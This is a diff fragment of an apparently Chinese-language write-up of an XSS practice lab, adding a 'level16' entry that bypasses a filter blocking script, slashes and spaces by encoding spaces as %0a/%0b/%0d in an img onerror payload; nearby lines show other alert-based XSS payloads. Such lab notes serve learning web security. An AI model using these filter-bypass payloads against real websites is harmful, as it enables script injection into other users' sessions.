@@ -113,7 +113,10 @@ payload：src="javascript:alert(666)"
 payload："><script>alert(1)</script><"
 ```
 
-
-
+## level16
+经测试，script和/均被过滤，空格符号也无法使用，但是on事件可以使用。使用img标签，将空格用%0a、%0b、%0d成功。</br>
+```
+payload：?keyword=<img%0dsrc=a%0donerror=alert(1)>
+```
 
 
